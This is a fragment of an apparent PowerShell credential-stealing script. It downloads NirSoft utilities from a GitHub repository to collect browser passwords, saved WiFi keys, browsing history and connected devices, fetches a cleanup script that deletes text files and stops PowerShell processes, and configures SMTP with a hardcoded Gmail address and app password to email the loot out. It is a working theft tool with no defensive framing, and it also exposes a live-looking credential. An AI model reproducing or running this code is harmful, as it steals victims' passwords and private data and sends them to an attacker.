...
Invoke-WebRequest https://raw.githubusercontent.com/jesaisquejenesaisrien/welcome/main/other_files/fin.ps1 -OutFile fin.ps1 #Download final .ps1 file to delete all .txt files and stop all powershell process
Invoke-WebRequest https://github.com/jesaisquejenesaisrien/welcome/blob/main/other_files/BrowsingHistoryView.exe?raw=true -OutFile BrowsingHistoryView.exe #Download the nirsoft tool for Browserhistory
Invoke-WebRequest https://github.com/jesaisquejenesaisrien/welcome/blob/main/other_files/WNetWatcher.exe?raw=true -OutFile WNetWatcher.exe #Download the nirsoft tool for connected devces
Invoke-WebRequest https://github.com/jesaisquejenesaisrien/welcome/blob/main/other_files/WirelessKeyView.exe?raw=true -OutFile WirelessKeyView.exe #Download the nirsoft tool for WiFi passwords
Invoke-WebRequest https://github.com/jesaisquejenesaisrien/welcome/blob/main/other_files/WebBrowserPassView.exe?raw=true -OutFile WebBrowserPassView.exe #Download the nirsoft tool for Browser passwords
...
$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('jevaisvousvoler@gmail.com', 'prsxacgmkvbrrfiq') #Email with which you want to send information
$ReportEmail = New-Object System.Net.Mail.MailMessage
$ReportEmail.From = 'jevaisvousvoler@gmail.com' #Email in which you want to receice the information
$ReportEmail.To.Add('jevaisvousvoler@gmail.com') #Email in which you want to receive the information
